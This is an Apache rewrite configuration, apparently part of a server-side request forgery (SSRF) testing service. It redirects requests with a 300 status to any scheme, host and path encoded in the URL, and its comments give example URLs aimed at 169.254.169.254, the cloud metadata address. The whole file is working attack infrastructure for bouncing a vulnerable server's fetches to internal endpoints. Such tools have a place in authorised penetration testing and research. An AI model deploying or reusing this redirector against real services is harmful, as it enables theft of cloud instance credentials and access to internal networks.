# 300 with response body
# https://ssrf.localdomain.pw/xml-with-body/300-http-169.254.169.254:80-.x.xml
# https://ssrf.localdomain.pw/xml-with-body/300-http-169.254.169.254:80-test/.x.xml
RewriteEngine on
RewriteCond %{REQUEST_URI} 300-([^/-]*)-([^/-]*)-(.*).x.xml$
RewriteRule 300-([^/-]*)-([^/-]*)-(.*).x.xml$ $1://$2/$3 [L,R=300,NC]

